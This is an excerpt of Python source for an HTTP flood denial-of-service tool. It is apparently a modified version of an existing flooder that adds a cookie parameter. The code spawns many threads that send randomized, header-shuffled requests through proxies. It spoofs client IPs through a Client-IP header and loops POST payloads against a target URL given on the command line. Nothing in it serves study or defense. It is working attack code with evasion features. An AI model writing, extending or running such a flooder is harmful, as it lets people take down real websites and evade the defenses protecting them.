...
class HttpFlood(Thread):
    ...
    _synevent: Any
    SENT_FLOOD: Any
    _cookie: str  # Add the cookie attribute
    ...
    def __init__(self,
                 ...
                 proxies: Set[Proxy] = None,
                 cookie: str = None) -> None:  # Add cookie parameter with default value
        Thread.__init__(self, daemon=True)
        ...
        self._cookie = cookie # Assign the cookie value
        ...
        # Initialize header randomization variables
        self._accept_encoding_values = [
            "gzip, deflate, br",
            "gzip, deflate",
            "br, gzip, deflate",
            "gzip",
        ...
        # Store headers that can be shuffled
        self._base_headers = [
        ...
        # Keep the original payload format for backward compatibility
    ...
    def SpoofIP(self) -> str:
        ...
        return (f"Client-IP: {spoof}\r\n")

    def generate_payload(self, other: str = None) -> bytes:
        # Select random variants for common headers
        accept_encoding = randchoice(self._accept_encoding_values)
        accept_language = randchoice(self._accept_language_values)
        
        # Create a list of standard headers
        standard_headers = [
            f'Accept-Encoding: {accept_encoding}',
            f'Accept-Language: {accept_language}',
            f'Cache-Control: {randchoice(self._cache_control_values)}',
            f'Connection: {randchoice(self._connection_values)}',
            'Sec-Fetch-Dest: document',
            'Sec-Fetch-Mode: navigate',
            'Sec-Fetch-Site: none',
            'Sec-Fetch-User: ?1',
        ...
        # Shuffle headers for unpredictability
        shuffle(standard_headers)
        
        # Build the complete request
        cookie_header = f"Cookie: {self._cookie}\r\n" if self._cookie else ""
        
        payload = (f"{self._req_type} {self._target.raw_path_qs} HTTP/1.1\r\n" + 
    ...
    def POST(self) -> None:
        # Randomize the payload size between 20 and 40 (inclusive)
        payload_size = randint(20, 40)

        # Generate a random string of the determined length
        random_string = ProxyTools.Random.rand_str(payload_size)

        body_data = '{"data": "%s"}' % random_string # Create the JSON body string
        body = str.encode(body_data)   # Encode the body to bytes *before* calculating length
        content_length = len(body)       # Calculate the *byte* length of the body

        payload = str.encode(   # Encode the *entire* payload (headers + body)
            (self._payload +
             f"Host: {self._target.authority}\r\n" +
             self.randHeadercontent +
             (f"Content-Length: {content_length}\r\n"  # Use the *calculated* Content-Length
              "X-Requested-With: XMLHttpRequest\r\n"
              "Content-Type: application/json\r\n\r\n") +
             body_data)  # append decoded body
        )

        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)  # Send the complete, correctly encoded payload
        Tools.safe_close(s)
    ...
    with suppress(KeyboardInterrupt):
        with suppress(IndexError):
            ...
            if method in Methods.LAYER7_METHODS:
                ...
                # check if debug mode is enabled and adjust cookie arg index
                if len(argv) >= 9 and argv[8].upper() == "DEBUG":  # Check for debug arg
                    logger.setLevel("DEBUG")
                    if len(argv) == 10:
                        cookie = argv[9]  # Get cookie if provided

                elif len(argv) >= 9 : #handle the cookie if the debug is not enabled
                        cookie = argv[8] # cookie is provided and debug is not.
                ...
                for thread_id in range(threads):
                    HttpFlood(thread_id, url, host, method, rpc, event,
                              uagents, referers, proxies, cookie).start()  # Pass cookie
